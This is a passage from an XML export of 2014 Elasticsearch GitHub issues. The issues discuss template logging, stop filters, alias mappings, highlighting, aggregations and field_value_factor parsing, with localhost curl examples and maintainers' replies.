</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Provide better logging on which index template is used during index creation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7421</link><project id="" key="" /><description>There are 2 ways to create an index template, using the _template end point (dynamic) and as static templates (under config/templates).   Currently, when an index is created matching a template (static or dynamic), we log the following entry in the ES log:

```
[2014-08-23 11:10:51,865][INFO ][cluster.metadata         ] [master2] [index_name] creating index, cause [api], shards [6]/[0], mappings [type1, type2]
```

There is no indication on which template it used to create the index.

We have seen situations in the field where the end user is confused because they have both dynamic and static templates defined (and dynamic templates take precedence), or if they have multiple templates with the same template matching criteria defined as static templates (so that 1 static template is overwriting the other).

It would be nice to provide some indication in the log regarding the template used when we write out the creating index entry to specify:
- if the template used is a dynamic or static template, if dynamic, the template name
- if it is a static template, the file name of the static template it is using
</description><key id="40981487">7421</key><summary>Provide better logging on which index template is used during index creation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels><label>enhancement</label><label>low hanging fruit</label></labels><created>2014-08-23T18:18:41Z</created><updated>2014-11-28T16:30:54Z</updated><resolved>2014-11-28T16:15:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="pkoenig10" created="2014-11-20T01:57:28Z" id="63749393">What should be logged in the case that multiple templates are used?
</comment><comment author="clintongormley" created="2014-11-24T12:31:35Z" id="64187608">Hi @pkoenig10

Thanks for picking this up.  In answer to your question, I'd say that we log the template names in the order that they're applied.  Or perhaps I've misunderstood?

When you're ready with your changes, please open a [PR](https://github.com/elasticsearch/elasticsearch/pulls) referencing this issue, and (if you haven't done so already) sign the [CLA](http://www.elasticsearch.org/contributor-agreement/)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Plugin point to add custom Lucene query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7420</link><project id="" key="" /><description>I have written my own Lucene custom query my implementing/extending the Query , Score and Weight classes. I want to plug this as a standard query to elasticsearch so that i can refer it over query JSON.

Please provide a pluginpoint to add this new custom made query as a Elasticsearch query.
</description><key id="40971220">7420</key><summary>Plugin point to add custom Lucene query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Vineeth-Mohan</reporter><labels><label>discuss</label></labels><created>2014-08-23T09:01:57Z</created><updated>2014-08-24T02:41:06Z</updated><resolved>2014-08-23T16:01:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="lpy" created="2014-08-23T11:14:17Z" id="53149999">I don't know if there is a way in Elasticsearch to use customized Lucene Query to extend Elasticsearch. I have found no documentations or examples(Analyzers have many examples on GitHub) mentioned how to do that. If there is a way to do that, I am very appreciated if someone could points it out.

Thank you so much!
</comment><comment author="bleskes" created="2014-08-23T16:01:56Z" id="53157003">Custom queries also need to be accompanied with a parser implementation that will take JSON and create the query object. You should be able to do so writing a plugin and calling the  `IndexQueryParserModule#addQueryParser` method (https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/index/query/IndexQueryParserModule.java#L126)

A good example of how to write a plugin can be found here: https://github.com/imotov/elasticsearch-native-script-example . It adds a custom script to the ScriptModule module. You should do an equivalent thing with IndexQueryParserModule
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update regexp-syntax.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7419</link><project id="" key="" /><description>string is &#8217;aaabbb'   , then the regexp  aa+bbb+   match the string .
</description><key id="40970969">7419</key><summary>Update regexp-syntax.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">jcoffeebean</reporter><labels><label>docs</label></labels><created>2014-08-23T08:50:40Z</created><updated>2015-01-16T01:17:06Z</updated><resolved>2014-09-07T09:42:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-23T12:00:18Z" id="53150931">Hi @jcoffeebean 

Thanks for the fix. Please could I ask you to sign the CLA so that I can merge it in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="clintongormley" created="2014-09-07T09:41:54Z" id="54742129">CLA not signed, treating as bug report
</comment><comment author="jcoffeebean" created="2015-01-16T01:16:26Z" id="70193685">sorry!!!  i am late!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Stop Filters are wrong in ElasticSearch 1.3.2</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7418</link><project id="" key="" /><description>With 1.3.2, if I execute this:
curl -XGET 'localhost:9200/_analyze?filter=stop' -d "game of thrones OR_REPLACE travel"

I get:
{"tokens":[{"token":"game","start_offset":0,"end_offset":4,"type":"&lt;ALPHANUM&gt;","position":1},{"token":"of","start_offset":5,"end_offset":7,"type":"&lt;ALPHANUM&gt;","position":2},{"token":"thrones","start_offset":8,"end_offset":15,"type":"&lt;ALPHANUM&gt;","position":3},{"token":"or_replace","start_offset":16,"end_offset":26,"type":"&lt;ALPHANUM&gt;","position":4},{"token":"travel","start_offset":27,"end_offset":33,"type":"&lt;ALPHANUM&gt;","position":5}]}

Notice, how "of" is not treated as a stop word. In previous version of ElasticSearch, you'll get this output:

{"tokens":[{"token":"game","start_offset":0,"end_offset":4,"type":"&lt;ALPHANUM&gt;","position":1},{"token":"thrones","start_offset":8,"end_offset":15,"type":"&lt;ALPHANUM&gt;","position":2},{"token":"or_replace","start_offset":16,"end_offset":26,"type":"&lt;ALPHANUM&gt;","position":3},{"token":"travel","start_offset":27,"end_offset":33,"type":"&lt;ALPHANUM&gt;","position":4}]}
</description><key id="40962986">7418</key><summary>Stop Filters are wrong in ElasticSearch 1.3.2</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">HenleyChiu</reporter><labels /><created>2014-08-23T00:46:33Z</created><updated>2014-08-23T11:54:54Z</updated><resolved>2014-08-23T11:54:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-23T11:54:54Z" id="53150797">There are a few things going on here:
1. The parameter is `filters` not `filter`
2. The `filters` parameter is not taken into account unless you also specify a `tokenizer`
3. The `standard` analyzer (used by default) used to remove stopwords, but doesn't do so since 1.0.0

So your query is actually showing the change in behaviour of the `standard` analyzer, not the `stop` filter.  Try this instead:

```
curl -XGET 'localhost:9200/_analyze?tokenizer=standard&amp;filters=stop' -d "
game of thrones OR_REPLACE travel
"
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>GET _mapping returns the index name instead of the alias name as the key</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7417</link><project id="" key="" /><description>Using ES v1.3.2, I have an index with an alias pointing to it:

``` javascript
PUT /myindex_1234
{
"mappings": {
    "type1": {
      "properties": {
        "field1": {
          "type": "string",
          "index": "not_analyzed"
        }
      }
    }
  },
  "aliases": {
    "myindex": {}
  }
}
```

When I get mapping using the alias, the results are keyed on the index name instead of the alias I used in the query:

``` javascript
GET /myindex/_mapping
```

``` javascript
{
   "myindex_1234": {
      "mappings": {
         "type1": {
            "properties": {
               "field1": {
                  "type": "string",
                  "index": "not_analyzed"
               }
            }
         }
      }
   }
}
```

This is problematic because my app knows nothing about the actual index name.  It is only aware of the alias name.  So when my app checks `$mapping['myindex']['mappings']` it doesn't find anything because the results actually exist in `$mapping['myindex_1234']['mappings']`

Is it possible to key the results with the alias name instead of the index name when querying _mapping using the alias?
</description><key id="40953044">7417</key><summary>GET _mapping returns the index name instead of the alias name as the key</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jsnod</reporter><labels /><created>2014-08-22T21:42:00Z</created><updated>2014-09-02T11:21:25Z</updated><resolved>2014-08-23T11:47:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-23T11:47:07Z" id="53150617">Hi @afx114 

No it isn't. An alias may point to several indices, each with different mappings. So the only way to return this information sanely is to use the concrete index names.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Highlighting array field - Also return non-matching entries</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7416</link><project id="" key="" /><description>I have an array field with the entries `[foo, foobar, bar]` and search for `foo`. The highlighting then returns for that field

```
[&lt;em&gt;foo&lt;/em&gt;, &lt;em&gt;foo&lt;/em&gt;bar]
```

I would like it to return 

```
[&lt;em&gt;foo&lt;/em&gt;, &lt;em&gt;foo&lt;/em&gt;bar, bar]
```

I did try to set `no_match_size` as described on http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-request-highlighting.html but that didn't work. Is there any way to make elasticsearch behave the way I want?
</description><key id="40950871">7416</key><summary>Highlighting array field - Also return non-matching entries</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">panmari</reporter><labels><label>:Highlighting</label></labels><created>2014-08-22T21:12:48Z</created><updated>2017-07-26T07:41:42Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-08-22T21:57:05Z" id="53125362">I don't believe it has an option to do that right now.  I don't think it'd be too hard to build though.
</comment><comment author="panmari" created="2014-08-29T23:23:27Z" id="53940179">What would be better: To respect the setting of no_match_size for every single array entry or introduce a new setting parameter?
</comment><comment author="leeho123" created="2016-02-10T13:34:51Z" id="182377566">Hi, did this ever get fixed? I'm relying on this functionality returning non-matched entries for my application.
</comment><comment author="prashanttct07" created="2016-03-24T18:57:34Z" id="200970599">Hi Team,
Is there any plan to fix this in ES 5.0
</comment><comment author="mouafa" created="2016-05-25T21:15:21Z" id="221709852">+1 here
</comment><comment author="edeak" created="2016-10-06T15:45:26Z" id="252003324">+1
</comment><comment author="cosmin-marginean" created="2016-11-16T16:18:05Z" id="260990834">+1
</comment><comment author="hmottestad" created="2017-03-06T22:17:54Z" id="284552122">Would also like this. Or some other way to find out what fields in the original document actually got highlighted when having nested documents with arrays. </comment><comment author="hvelucha" created="2017-03-09T04:10:44Z" id="285249538">+1</comment><comment author="ashitpupu" created="2017-03-18T08:56:26Z" id="287527267">any fixes available for this ??? My work would hugely depend on this.
If any fixes or script available, please let me know.
</comment><comment author="vcollignon" created="2017-06-09T12:11:56Z" id="307372435">+1</comment><comment author="markisme" created="2017-07-26T07:41:42Z" id="317974927">Waiting for any fixes...</comment></comments><attachments /><subtasks /><customfields /></item><item><title>formalize definition of backwards compatibility</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7415</link><project id="" key="" /><description>We have made a commitment to preserve backwards compatibility across minor and maintenance releases.  I think everyone understands this to mean API level compatibility.  We should refine this with a document that describes treatment of other public aspects of the product.  Examples include command line names, config variable names, log file syntax, ... what exactly of these extra things is considered subject to backwards compatibility constraints?
</description><key id="40950205">7415</key><summary>formalize definition of backwards compatibility</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/debadair/following{/other_user}', u'events_url': u'https://api.github.com/users/debadair/events{/privacy}', u'organizations_url': u'https://api.github.com/users/debadair/orgs', u'url': u'https://api.github.com/users/debadair', u'gists_url': u'https://api.github.com/users/debadair/gists{/gist_id}', u'html_url': u'https://github.com/debadair', u'subscriptions_url': u'https://api.github.com/users/debadair/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/362578?v=4', u'repos_url': u'https://api.github.com/users/debadair/repos', u'received_events_url': u'https://api.github.com/users/debadair/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/debadair/starred{/owner}{/repo}', u'site_admin': False, u'login': u'debadair', u'type': u'User', u'id': 362578, u'followers_url': u'https://api.github.com/users/debadair/followers'}</assignee><reporter username="">kevinkluge</reporter><labels><label>docs</label></labels><created>2014-08-22T21:04:31Z</created><updated>2016-01-15T12:38:25Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Use node's cluster name as a default for an incoming cluster state who misses it</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7414</link><project id="" key="" /><description>The ClusterState has a reference to the cluster name since version 1.1.0 (df7474b9fcf849bbfea4222c1d2aa58b6669e52a) . However, if the state was  sent from a master of an older version, this name can be set to null. This is unexpected and can cause bugs. The bad part is that it will never correct itself until a full cluster restart where the cluster state is rebuilt using the code of the latest version.

This commit changes the default to the node's cluster name.

 Relates to #7386
</description><key id="40947730">7414</key><summary>Use node's cluster name as a default for an incoming cluster state who misses it</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Cluster</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T20:35:15Z</created><updated>2015-06-07T19:02:36Z</updated><resolved>2014-08-27T18:26:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-22T20:40:22Z" id="53117517">LGTM
</comment><comment author="nik9000" created="2014-08-22T20:47:47Z" id="53118437">Looks great!  Thanks!
</comment><comment author="martijnvg" created="2014-08-22T22:00:37Z" id="53125666">LGTM
</comment><comment author="nik9000" created="2014-08-23T13:41:53Z" id="53153169">Used this pull request to resolve #7386 locally by:
1.  Applying it directly to the v1.3.2 tag.
2.  Deploying it as a master only node with the lowest id.
2a.  Had to build a tool to pick an id low enough.
3.  Stopping the current master

Then all I had to do was:
1.  Wait for the update to take (pretty much instant, but I wanted to see the disk usage freed). 
2.  Remove the master only node with the new code.
3.  Start the old master.

So this works.  Rather, it worked for me.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Introduced IndexTemplateFilter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7413</link><project id="" key="" /><description>Added the ability to register filters on the index templates that are being applied when a new index is created. These filters will be able to filter out templates that should not be applied to newly created index.
</description><key id="40940709">7413</key><summary>Introduced IndexTemplateFilter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">uboness</reporter><labels /><created>2014-08-22T19:11:49Z</created><updated>2014-08-26T11:43:09Z</updated><resolved>2014-08-26T11:42:58Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-23T03:46:12Z" id="53141706">Left one comment. Otherwise, LGTM.
</comment><comment author="javanna" created="2014-08-26T11:42:58Z" id="53407718">superseded by #7454 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>`index` and `type` aggregations</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7412</link><project id="" key="" /><description>A `type` aggregation can easily emulated using a `terms` aggregation on the `_type` field, although it's a bit of a hack:

``` json
{
  "query": {...},
  "aggs": {
    "byType": {
      "terms": {
        "field": "_type"
      }
      // any sub-aggs
    }
  }
}
```

However if the query is run over multiple indices, it could come into handy to further know which index each type comes from.
With an `index` aggregation (and first class `type` aggregation) it would become as simple as:

``` json
{
  "query": {...},
  "aggs": {
    "byIndex": {
      "index": {},
      "aggs": {
        "byType": {
          "type": {}
          // any sub-aggs
        }
      }
    }
  }
}
```

In the same spirit as the `indices` query and filter, the `index` aggregation would be very easy to implement, merely putting every document into the only single bucket, corresponding to the index of the `SearchContext`.
Likewise, the `type` aggregation is certainly quite simple to implement.
</description><key id="40939177">7412</key><summary>`index` and `type` aggregations</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ofavre</reporter><labels /><created>2014-08-22T18:56:51Z</created><updated>2014-08-22T22:03:47Z</updated><resolved>2014-08-22T19:21:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-22T19:05:38Z" id="53106932">&gt; A type aggregation can easily emulated using a terms aggregation on the _type field, although it's a bit of a hack

What makes you feel that it is a hack? Some of the root fields support field data (eg. `_type`, `_index` since 1.2.0, `_timestamp`, ...) and they are perfectly fine to use in scripts, sort expressions or aggregations? I am also a bit on the fence to add more aggregations that would essentially be specialized terms aggregations with the only advantage being that you wouldn't need to specify the field name (while all other options would need to be supported and work the same way).
</comment><comment author="clintongormley" created="2014-08-22T19:10:21Z" id="53107476">@jpountz i agree - if these work with an ordinary term agg, i would much prefer not adding specialized aggs like this.  
</comment><comment author="ofavre" created="2014-08-22T19:16:16Z" id="53108100">If it works against `_index` too, that's fine to me. I did't upgrade against 1.2 yet, my bad.

Are these fields required to be stored or indexed for the `terms` aggregation to work against them?
</comment><comment author="jpountz" created="2014-08-22T19:21:40Z" id="53108724">They need to either be indexed or [have doc values enabled](http://www.elasticsearch.org/blog/disk-based-field-data-a-k-a-doc-values/).
</comment><comment author="ofavre" created="2014-08-22T19:32:43Z" id="53109980">So if I understand properly, it wouldn't work by against `_index` with the default configuration.
Making it work would require to make the index bigger (either indexing the field or storing doc values).
That's a shame for a field that is naturally part of the context.

Making the `terms` aware of the optimization for the `_index` field might be the right compromise.

By the way, does the parsing of aggregations depend on the mappings? I'm thinking of the `children` aggregation in particular.
The `indices` query is _necessary_ when a query uses a `parent` or `child` query, because the latter would cause a parsing-type failure when being parsed against an index not having the designated parent/child type.
Maybe the same argument applies for aggregations, making an `indices` aggregation necessary.
(I'm aware that the `indices` aggregation and the discussed `index` aggregation are _not necessarily_ the same thing).
</comment><comment author="jpountz" created="2014-08-22T19:49:00Z" id="53111831">Actually, what you really need to run the terms aggregation is what we call field data. There are two major flavors of field data: either uninverted from the inverted index at search time (default) or computed at indexing time (doc values). There is one exception to this rule: the `_index` field has a special field data implementation that is a "fake" implementation (introduced in 1.2.0, before that it would have required to be indexed or docvalued too) that associates the name of the index with every document.

This field data impl on `_index` works regardless of the configuration of the field (so even though the field is neither indexed nor docvalued by default this will work) and `_type` is indexed by default, so it is possible to have field data for it as well.

Indeed the parsing of aggregations depends on the mapping. For example we use completely different terms implementations on string and numeric fields.

I get your point about the `indices` aggregation, maybe this is something that we could add since we already have an unmapped mode for aggregations in case some queried indices don't have a mapping for the requested field. I need to think more about whether it would be necessary/help.
</comment><comment author="ofavre" created="2014-08-22T22:03:47Z" id="53125975">Your explanation makes it clear, thank you.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Type name and field name conflict</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7411</link><project id="" key="" /><description>Steps to reproduce

```

curl -XPOST 'http://localhost:9200/test/sublocality/1' -d '{
    "name" : "xxx",
    "country" : 
    {
        "name" : "yyy"
    }
}'
curl -XPOST 'http://localhost:9200/test/country/1' -d '{
    "name" : "zzz",
    "country" : 
    {
        "name" : "yyy"
    }
}'

curl -XPOST 'http://localhost:9200/test/_search' -d '{
  "query": {
    "match_all": {}
  },
  "facets": {
    "term": {
      "terms": {
        "field": "country.name",
        "size": 10
      }
    }
  }
}'
{"took":3,"timed_out":false,"_shards":{"total":5,"successful":5,"failed":0},"hits":{"total":2,"max_score":1.0,"hits":[{"_index":"test","_type":"sublocality","_id":"1","_score":1.0,"_source":{
    "name" : "xxx",
    "country" : 
    {
        "name" : "yyy"
    }
}},{"_index":"test","_type":"country","_id":"1","_score":1.0,"_source":{
    "name" : "zzz",
    "country" : 
    {
        "name" : "yyy"
    }
}}]},"facets":{"term":{"_type":"terms","missing":0,"total":2,"other":0,"terms":[{"term":"zzz","count":1},{"term":"xxx","count":1}]}}}

```

This gives 1 ZZZ and  1 XXX instead of 2 YYY.

But then 

```

{
  "query": {
    "match_all": {}
  },
  "facets": {
    "term": {
      "terms": {
        "field": "country.country.name",
        "size": 10
      }
    }
  }
}
```

Gives the expected result.
</description><key id="40935530">7411</key><summary>Type name and field name conflict</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Vineeth-Mohan</reporter><labels /><created>2014-08-22T18:15:24Z</created><updated>2014-08-22T19:04:41Z</updated><resolved>2014-08-22T19:04:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T19:04:41Z" id="53106821">Hi @Vineeth-Mohan 

Yes, we're aware of it and are planning in making fieldname resolution ambiguous in #4081
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>If the `_type` field isn't indexed nested inner docs must be filtered out.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7410</link><project id="" key="" /><description /><key id="40930829">7410</key><summary>If the `_type` field isn't indexed nested inner docs must be filtered out.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Nested Docs</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T17:31:31Z</created><updated>2015-06-07T19:02:46Z</updated><resolved>2014-08-24T22:20:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-22T17:33:09Z" id="53093621">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Use a default host name if localAddress is not available</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7409</link><project id="" key="" /><description>I'm trying to do integration testing on an application backed by elasticsearch, and running in to trouble.

At this point, the specific test method that is being called is essentially empty; as a stub, it is

```
@ClusterScope(scope=Scope.SUITE, numNodes=1)
public class EsMappingTest extends ElasticsearchIntegrationTest {
    @Test
    public void testMappingForIndexContainer() {}
}
```

I receive the attached error when attempting to run that test; the strange thing is, it is not reproducible on other machines that we've tried, and continues to happen even when we use the JAR files compiled on those other machines.  All other (non-elasticsearch) tests work perfectly well.

Here's the error:

JUnit version 4.10
E14/08/22 09:32:52 ERROR elasticsearch.test: FAILURE  : com.lumiata.lumigraph.datastore.internal.elasticsearch.EsMappingTest
REPRODUCE WITH  : mvn test -Dtests.seed=42012D4D1D344754 -Dtests.class=com.lumiata.lumigraph.datastore.internal.elasticsearch.EsMappingTest -Dtests.prefix=tests -Dfile.encoding=UTF-8 -Duser.timezone=America/Los_Angeles
Throwable:
java.lang.NullPointerException
    __randomizedtesting.SeedInfo.seed([42012D4D1D344754]:0)
    org.elasticsearch.test.TestCluster.clusterName(TestCluster.java:308)
    org.elasticsearch.test.ElasticsearchIntegrationTest.beforeClass(ElasticsearchIntegrationTest.java:178)
    [...sun._, com.carrotsearch.randomizedtesting._, java.lang.reflect._]
    org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:46)
    org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:42)
    [...com.carrotsearch.randomizedtesting._]
    org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:43)
    org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:48)
    org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:70)
    org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:55)
    [...com.carrotsearch.randomizedtesting.*]
    java.lang.Thread.run(Thread.java:745)
</description><key id="40927272">7409</key><summary>Test: Use a default host name if localAddress is not available</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">nrpeterson</reporter><labels><label>low hanging fruit</label><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-22T16:50:28Z</created><updated>2015-06-07T12:11:27Z</updated><resolved>2014-08-23T11:51:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nrpeterson" created="2014-08-22T18:18:52Z" id="53101125">It turns out that the issue here is with Mac / Java 7: for some reason, java.net.InetAddress was returning null, causing the null pointer exception; I was able to resolve it by manually adding a new entry to my /etc/hosts.
</comment><comment author="s1monw" created="2014-08-23T11:51:32Z" id="53150708">I pushed a fix for this just to make sure you don't run into that for no reason
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>field_value_factor accepts arrays values, does not throw error</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7408</link><project id="" key="" /><description>In trying to figure out whether I could use multiple fields in a `field_value_factor` clause (which is not possible, I think?), I spotted a bug.

Passing in arrays like so:

```
"field_value_factor": {
  "field": ["age", "price"],
  "modifier": [ "log1p", "sqrt"],
  "factor": [1.2, 2]
}
```

Leads to this being executed:

```
"field_value_factor": {
  "field": "price",
  "modifier": "sqrt"
  "factor": 2
}
```

It might be better to throw an error if unexpected data types are passed in here.

As an aside, it would be great to be able to use multiple fields somehow in the `field_value_factor` to tune the score.
</description><key id="40923937">7408</key><summary>field_value_factor accepts arrays values, does not throw error</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mattty</reporter><labels><label>adoptme</label><label>bug</label><label>low hanging fruit</label></labels><created>2014-08-22T16:16:23Z</created><updated>2015-02-04T22:20:21Z</updated><resolved>2015-02-04T22:20:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kumartheashwani" created="2014-08-23T21:25:40Z" id="53166407">It seems a good one to start contributing. 
</comment><comment author="cfontes" created="2014-09-02T07:02:56Z" id="54115929">I tried it and I think the fix is pretty simple.

The problem is that to test this it takes a newbie like me way more effort than to fix it.

Any ideas?
</comment><comment author="dakrone" created="2014-09-02T07:44:01Z" id="54118877">@cfontes you should be able to take a look at `FieldValueFactorParser` line 67 for where the factor is parsed and add some code to determine whether it is an array or a single value. The rest of the parsing is in this file also. The actual execution is in `FieldValueFactorFunction.score`.
</comment><comment author="dakrone" created="2014-09-02T07:52:36Z" id="54119526">Whoops sorry, I misread your message about the testing being the hard part instead of the feature. You should be able to add a test in `FunctionScoreTests` that just checks that the query is not allowed and throws an exception.
</comment><comment author="cfontes" created="2014-09-02T07:54:48Z" id="54119708">@dakrone thanks, I looked at that before and as I said it looks easy to fix. I ended up on those exact places.

My problem is with testing this, because as far as I can see from my limited knowledge of ES code
I would need to create valid instances of `QueryParseContext parseContext`, `XContentParser parser` which in itself is not easy task as far as I could understand ( I tryed it, not just talking the talk.)

